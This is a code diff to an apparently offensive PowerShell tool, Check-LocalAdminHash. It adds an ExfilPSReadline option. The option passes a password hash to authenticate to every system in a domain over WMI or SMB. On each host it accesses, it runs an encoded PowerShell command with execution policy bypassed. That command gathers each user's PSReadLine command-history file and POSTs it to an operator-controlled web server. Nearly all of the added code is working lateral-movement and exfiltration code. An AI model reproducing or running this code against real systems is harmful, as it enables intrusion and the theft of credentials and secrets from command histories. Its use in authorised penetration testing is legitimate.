@@ -53,6 +53,10 @@ Function Check-LocalAdminHash{
     .PARAMETER Threads
 
     Defaults to 5 threads. (I've run into some odd issues setting threads more than 15 with some results not coming back.)
+    
+    .PARAMETER ExfilPSReadline
+
+    For each system where auth is successful it runs a PowerShell command to locate PSReadLine console history files (PowerShell command history) and then POSTS them to a web server. See the Readme for server setup. 
 
     .EXAMPLE
 
@@ -86,6 +90,16 @@ Function Check-LocalAdminHash{
         Description
         -----------
         This command attempts to perform a local authentication for the user Administrator against the system 192.168.0.16 over SMB.
+
+    
+    .EXAMPLE
+
+        C:\PS> Check-LocalAdminHash -Domain testdomain.local -UserDomain testdomain.local -Username PossibleAdminUser -PasswordHash E62830DAED8DBEA4ACD0B99D682946BB -AllSystems -ExfilPSReadline
+
+        Description
+        -----------
+        This command will use the domain 'testdomain.local' to lookup all systems and then attempt to authenticate to each one using the user 'testdomain.local\PossibleAdminUser' and a password hash over WMI. It then attempts to locate PowerShell console history files (PSReadline) and POST them to a web server. See Readme for server setup.
+
 
 #>
 Param
@@ -128,12 +142,16 @@ Param
     
     [Parameter(Position = 9, Mandatory = $false)]
     [Int]
-    $Threads = 5
+    $Threads = 5,
+
+    [Parameter(Position = 10, Mandatory = $false)]
+    [Switch]
+    $ExfilPSReadline
 )
     
 
     $LocalAdminCheckBlock = {
-                param($Hostlist, $Username, $PasswordHash, $UserDomain, $Protocol)
+                param($Hostlist, $Username, $PasswordHash, $UserDomain, $Protocol, $ExfilPSReadLine)
                     
                      
        ##### Had to include Invoke-TheHash within this code block
@@ -4615,6 +4633,79 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
 #######################END OF CODE COPIED FROM Invoke-TheHash #######################
 ############################### Thanks Kevin Robertson!!! ##########################
 
+#Gen-EncodedUploadScript generates a PowerShell encoded command to use with WMIExec or SMBExec to exfil a file to a webserver. 
+
+Function Gen-EncodedUploadScript{
+
+    param(
+    [Parameter(Position = 1, Mandatory = $false)]
+    [string]
+    $UploadURL = ""
+
+    )
+$UnencodedCommand = {
+
+######## Manually change the URL here for now until I figure out 
+########how to pass the variable into this part that gets encoded
+########See the Readme for server setup.
+$Url = "https://<this-is-the-server-you-setup-address>/index.php"
+################################################################
+
+$UserProfiles = Get-ChildItem C:\Users\ | Where-Object {$_.PSIsContainer} | Foreach-Object {$_.Name}
+$hostname = [System.Net.Dns]::GetHostName()
+#Checking every profile for PSReadline
+foreach($profile in $UserProfiles){
+    $ReadLineExists = Test-Path C:\Users\$profile\appdata\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+    if ($ReadLineExists){
+    
+    $FilePath = "C:\Users\$profile\appdata\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+    #Building the body of a POST request to server.
+    $boundary = [Guid]::NewGuid().ToString()
+    $bodyStart = @"
+--$boundary
+Content-Disposition: form-data; name="uploaded_file"; filename="$("PSReadLine-" + $hostname + "-" + $profile + ".txt")"
+Content-Type: multipart/form-data
+
+
+"@
+
+$bodyEnd = @"
+
+--$boundary--
+"@
+$requestInFile = (Join-Path -Path $env:TEMP -ChildPath ([IO.Path]::GetRandomFileName()))
+
+
+      $fileStream = (New-Object -TypeName 'System.IO.FileStream' -ArgumentList ($requestInFile, [IO.FileMode]'Create', [IO.FileAccess]'Write'))
+
+
+        $bytes = [Text.Encoding]::UTF8.GetBytes($bodyStart)
+        $fileStream.Write($bytes, 0, $bytes.Length)
+        $bytes = [IO.File]::ReadAllBytes($FilePath)
+        $fileStream.Write($bytes, 0, $bytes.Length)
+        $bytes = [Text.Encoding]::UTF8.GetBytes($bodyEnd)
+        $fileStream.Write($bytes, 0, $bytes.Length)
+
+        $fileStream.Close()
+        $fileStream = $null
+        [GC]::Collect()
+
+      $contentType = 'multipart/form-data; boundary={0}' -f $boundary
+      (Microsoft.PowerShell.Utility\Invoke-RestMethod -Uri $Url -Method Post -InFile $requestInFile -ContentType $contentType -ErrorAction Stop -WarningAction SilentlyContinue)
+
+
+      $null = (Remove-Item -Path $requestInFile -Force -Confirm:$false)
+      $contentType = $null
+      [GC]::Collect()
+    }
+}
+}
+    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($UnencodedCommand) 
+    $Base64 = [Convert]::ToBase64String($Bytes) 
+
+    return $Base64
+}
+
 if ($Protocol -eq "WMI")
                     {
                         #$count = 1
@@ -4641,7 +4732,14 @@ if ($Protocol -eq "WMI")
                                 
                                 if($WMIConnectResult -match "accessed"){
                                    #$successcount++
+                                   if($ExfilPSReadline){
+                                   $Base64 = Gen-EncodedUploadScript
+                                    $Base64 | out-file C:\temp\b64.txt
+                                    Invoke-WMIExec -Target $Target -Username $Username -Hash $PasswordHash -Command "powershell.exe -exec bypass -encodedcommand $Base64"
+                                   }
+                                   else{
                                    Write-Output "[*] Successfuly accessed $Target as an admin."
+                                   }
 
                                 }
                                 
@@ -4674,7 +4772,14 @@ if ($Protocol -eq "WMI")
                                     #Checking output of Invoke-SMBExec to determine if successful or not
                                     if($SMBConnectResult -match "has Service Control Manager write privilege"){
                                         #$successcount++
+                                        if($ExfilPSReadline){
+                                        $Base64 = Gen-EncodedUploadScript
+                                        $Base64 | out-file C:\temp\b64.txt
+                                        Invoke-WMIExec -Target $Target -Username $Username -Hash $PasswordHash -Command "powershell.exe -exec bypass -encodedcommand $Base64"
+                                        }
+                                        else{
                                         Write-Output "[*] Successfuly accessed $Target as admin."
+                                        }
                                     }
             
                                 }
@@ -4713,6 +4818,7 @@ if ($Protocol -eq "WMI")
                 'UserDomain' = $UserDomain
                 'Protocol' = $Protocol
                 'counttotal' = $counttotal
+                'ExfilPSReadline' = $ExfilPSReadline
                        
         
             }
